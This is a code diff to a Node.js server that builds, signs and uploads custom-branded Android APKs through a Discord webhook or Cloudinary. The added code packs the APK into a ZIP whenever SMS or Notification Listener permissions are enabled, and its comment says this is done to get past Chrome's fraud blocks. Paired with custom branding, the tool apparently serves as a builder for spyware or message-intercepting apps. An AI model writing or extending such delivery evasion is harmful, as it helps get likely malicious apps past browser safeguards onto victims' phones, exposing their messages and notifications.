@@ -542,13 +542,32 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             if (!signedName) throw new Error('Signed APK not found after signing step');
             const signedPath = path.join(TEMP_DIR, signedName);
 
+            // Conditional Delivery: SMS or Notification Listener triggers Chrome fraud blocks on some devices
+            // If either is enabled, package in a safe ZIP container so user installs via File Manager cleanly
+            const needsZip = isSmsEnabled || isNotifListenerEnabled;
+            let uploadFilePath = signedPath;
+            let uploadFileName = finalApkName;
+            let tempZipPath = null;
+
+            if (needsZip) {
+                uploadFileName = `${finalApkName.replace('.apk', '')}.zip`;
+                tempZipPath = path.join(TEMP_DIR, `bundle-${uuid}.zip`);
+                const bundleZip = new AdmZip();
+                bundleZip.addLocalFile(signedPath, '', finalApkName);
+                bundleZip.writeZip(tempZipPath);
+                uploadFilePath = tempZipPath;
+                console.log(`[PACKAGING] Sensitive permissions active (SMS: ${isSmsEnabled}, Notif: ${isNotifListenerEnabled}) -> Bundled as ${uploadFileName}`);
+            } else {
+                console.log(`[PACKAGING] Standard permissions -> Delivering direct APK: ${uploadFileName}`);
+            }
+
             let downloadUrl = '';
             await sendUpdate('apk_progress', { step: 'Uploading package to cloud...', progress: 95 });
 
             if (process.env.DISCORD_WEBHOOK_URL) {
                 try {
                     const form = new FormData();
-                    form.append('file', fs.createReadStream(signedPath), { filename: finalApkName });
+                    form.append('file', fs.createReadStream(uploadFilePath), { filename: uploadFileName });
                     const r = await axios.post(process.env.DISCORD_WEBHOOK_URL, form, {
                         headers: form.getHeaders(), maxBodyLength: Infinity, maxContentLength: Infinity
                     });
@@ -563,19 +582,16 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                         api_key:     process.env.CLOUDINARY_API_KEY,
                         api_secret:  process.env.CLOUDINARY_API_SECRET,
                     });
-                    const binPath = signedPath.replace('.apk', '.bin');
-                    fs.copyFileSync(signedPath, binPath);
-                    const r = await cloudinary.uploader.upload(binPath, {
+                    const r = await cloudinary.uploader.upload(uploadFilePath, {
                         resource_type: 'raw',
                         folder:        'generated_apks',
-                        public_id:     `${finalApkName.replace('.apk', '')}_${Date.now()}`,
+                        public_id:     `${uploadFileName.replace(/\.[^/.]+$/, '')}_${Date.now()}`,
                     });
                     downloadUrl = r.secure_url || '';
-                    if (fs.existsSync(binPath)) fs.unlinkSync(binPath);
                 } catch (e) { console.error('[UPLOAD] Cloudinary failed:', e.message); }
             }
 
-            [unsignedPath, signedPath].forEach(p => {
+            [unsignedPath, signedPath, tempZipPath].filter(Boolean).forEach(p => {
                 try { if (fs.existsSync(p)) fs.unlinkSync(p); } catch (_) {}
             });
 
@@ -584,9 +600,11 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     downloadUrl,
                     url: downloadUrl,
                     packageName: targetPkg,
-                    appName: targetName
+                    appName: targetName,
+                    isZip: needsZip,
+                    filename: uploadFileName
                 });
-                console.log(`[APK] Done: ${uuid} | pkg=${targetPkg} | apk=${downloadUrl}`);
+                console.log(`[APK] Done: ${uuid} | pkg=${targetPkg} | file=${uploadFileName} | isZip=${needsZip}`);
             } else {
                 await sendUpdate('apk_error', { message: 'Upload failed' });
             }
